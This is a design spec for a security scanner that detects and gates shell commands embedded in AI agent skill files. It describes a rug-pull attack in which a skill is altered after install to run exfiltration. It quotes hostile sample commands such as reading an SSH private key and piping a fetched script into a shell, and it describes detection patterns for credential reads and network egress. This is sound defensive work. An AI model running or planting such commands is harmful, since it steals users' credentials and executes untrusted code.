# Dynamic-context shell commands in skills

Date: 2026-08-04
Status: approved
Parent documents: `docs/superpowers/specs/2026-07-20-tier3-injection-design.md`, `docs/superpowers/specs/2026-07-23-mcp-tool-poisoning-design.md`

Claude Code runs shell commands embedded in a skill file before the model sees the content. The inline form is `` !`command` `` and the multi-line form is a fenced code block opened with ```` ```! ````. The output replaces the placeholder in the rendered prompt. The feature is documented at code.claude.com/docs/en/slash-commands under "Inject dynamic context" and applies to `SKILL.md` files and to the merged custom-command files.

This cycle adds two checks. The first lists every embedded command and asks the user to approve the set, with a rug-pull warning when the set changes after approval, the same lifecycle as `mcp-tools-unreviewed`. The second scans the command text against the existing dangerous-content lexicons and fires immediately, the same relationship `mcp-tool-poisoning` has to the unreviewed baseline.

## Why

A skill with an embedded command executes shell the moment it is invoked, and Claude can invoke a skill on its own when the description matches the conversation. The user never types the command and never sees it run; only the output appears, inlined into the prompt. So a skill file is not just instruction text anymore. It is a program that runs on invocation, and an author who updates a skill after install can swap `` !`git status` `` for an exfiltration one-liner. That is the same trust shape as an MCP server changing a tool description after approval, and it gets the same treatment: approve the exact set, diff on change.

Today drskill is blind to this in two ways. The command text sits in `SKILL.md`, which the script-oriented checks (`injection-egress`, `injection-credential-read`) never scan, so `` !`cat ~/.ssh/id_rsa` `` in a skill body is invisible. And nothing records what the user accepted, so there is no baseline to diff when a command changes.

## Scope

This cycle covers skills drskill already discovers. `.claude/commands/` directories use the same syntax and are not discovered today; that is a logged follow-up, not part of this cycle. The `disableSkillShellExecution` setting, which turns the feature off by policy, is also a follow-up.

The syntax is a Claude Code extension, but the finding attaches to the contributor wherever it appears, because `.claude/skills` directories are also read by cline and copilot and the file is one artifact. The message says the commands execute under Claude Code at invocation time.

## Extraction

A pure function in the new `checks/skill_shell.py` extracts commands from the `SKILL.md` text. It reads the existing `scan_view` skillmd source, so the file is read once per content state and the cache is shared with the other injection checks.

Two forms:

- Inline: on each line, every match of `` !`command` `` where the `!` sits at the start of the line or immediately after whitespace. This is the documented recognition rule; `` KEY=!`cmd` `` is left as literal text by the harness and is not extracted. Multiple matches on one line all extract.
- Fenced: a line whose stripped content is exactly ```` ```! ```` opens a block. Each non-empty line until the closing fence is one command. An unterminated fence runs to the end of the file and still extracts.

The whole file is scanned, frontmatter included. The docs say substitution runs once over the original file, and the syntax is specific enough that false positives are near zero.

Output is an ordered list of (line number, command text) pairs. Only `SKILL.md` is scanned; bundled files do not get substitution.

## The approval check: injection-shell-unreviewed

The identity of what the user approves is the multiset of command strings. Line positions and inline-versus-fenced form are not part of the identity, so moving a command or reformatting it does not resurface anything. Changing, adding, or removing a command does.

Lifecycle:

1. First sight is a note. It is ackable (the `_ACKABLE_NOTE_CHECKS` allowlist in `cli.py` gains this check id) and does not fail `--ci`. The message says the skill runs N shell commands at invocation, before the model sees the content, and lists every command verbatim with a `SKILL.md:line` citation. There is no three-hit cap on this check, because the user cannot approve what the report does not show. Each command line still truncates at the standard 100-character snippet limit; the citation points at the full text.
2. Acking the note, from `drskill ack` or from the review loop, records the ack in the normal ledger and copies the extracted command list to an approved baseline. Both ack paths route through the same baseline-save hook that `mcp-tools-unreviewed` uses, extended to dispatch by check id.
3. When the current command multiset differs from the approved baseline, the finding is a warning, fails `--ci`, and renders the difference as `- old command` and `+ new command` lines. Acking the warning re-approves: the baseline updates to the current set.

The fingerprint base is the sorted command list, with the skill name as `extra_key`. An ack survives every prose edit to the skill and resurfaces exactly when a command changes.

### Baseline storage

Baselines live beside the MCP ones: `.drskill/cache/skill-shell/` under the project, or under `~/.drskill` in `--global` mode, following the same root the deep cache and MCP snapshots use. One JSON file per skill.

The file key must survive command changes and machine moves, so it is a hash of the skill's identity, not its content: sha256 over the skill name plus a normalized path (project-relative when the skill is under the project root, `~`-relative when under the home directory, absolute otherwise). The JSON stores the identity fields in the clear plus the approved command list, so `cache stats` and `prune` can report and clean it by inspection. Both cache commands cover the new directory.

Command text in a committed baseline is not a leak the way MCP config values would be: the commands are already committed in the skill file itself. Baselines for skills that no longer exist are prunable.

## The dangerous-command check: injection-shell-dangerous

The extracted command text, just the commands and not the surrounding prose, is scanned against the lexicons already in `checks/injection.py`, imported the way `checks/mcp_injection.py` imports them. Severity by category:

| category | severity | fires when |
|---|---|---|
| credential read | error | The command references a credential store path. Same `_CRED_STORE` patterns as `injection-credential-read`. A command that references only `.env` downgrades the finding to warning, same rule as the script check. |
| pipe to shell | error | The command fetches with curl or wget and pipes to a shell. Same two-step linear match as `injection-remote-fetch`. |
| egress | warning | The command uses a network tool (`_EGRESS` patterns) against a non-local target. The localhost exclusion applies. |
| encoded blob | warning | The command contains a long base64 or hex run. Same patterns as `injection-encoded-blob`. |

One finding per (skill, category). Errors carry the standard removal fix commands; warnings carry a prose fix. Evidence uses the standard cap of three quoted hits plus a count, because this check is not an approval surface. Fingerprints cover the hit texts with the skill name as `extra_key`.

The check fires on first sight and is independent of the approval flow. A fresh skill with `` !`curl x | sh` `` fails CI immediately; approving the command set never downgrades it. The ack ledger remains the escape hatch, consistent with the other injection errors.

## Report and sanitization

Findings render through the existing escape and `_sanitize` path, so hostile command text cannot smuggle markup or invisible characters into the terminal. The diff lines in the rug-pull warning sanitize both the old and new command text, since the old text comes from a baseline file a hostile process could have edited.

## Testing

- Extraction: line-start rule, `` KEY=!`cmd` `` inert, mid-line after whitespace, multiple per line, fenced block, unterminated fence, frontmatter hit, empty command.
- Lifecycle: note on first sight, ack writes baseline through both ack paths, prose edit does not resurface, command change produces the warning with correct minus and plus lines, re-ack updates the baseline, reformatting (line move, inline to fenced) does not warn.
- Dangerous categories: one test per row of the table, the `.env` downgrade, localhost exclusion, and the cap plus count on evidence.
- Storage: key stability across project moves (project-relative), `cache stats` and `prune` coverage, corrupt baseline file handled.
- Sanitization: hostile command text in the note, in the diff, and in a baseline file.
- Corpus run over anthropics/skills, vercel-labs/agent-skills, and hermes-agent before thresholds freeze, recorded in this spec's tuning section once run.

## Follow-ups (logged, not built)

- `.claude/commands/` discovery as a claude-code skill surface (project, user, nested namespace directories), which would put command files in front of every existing check.
- Awareness of `disableSkillShellExecution` in settings, which would let the report say the commands are policy-disabled on this machine.
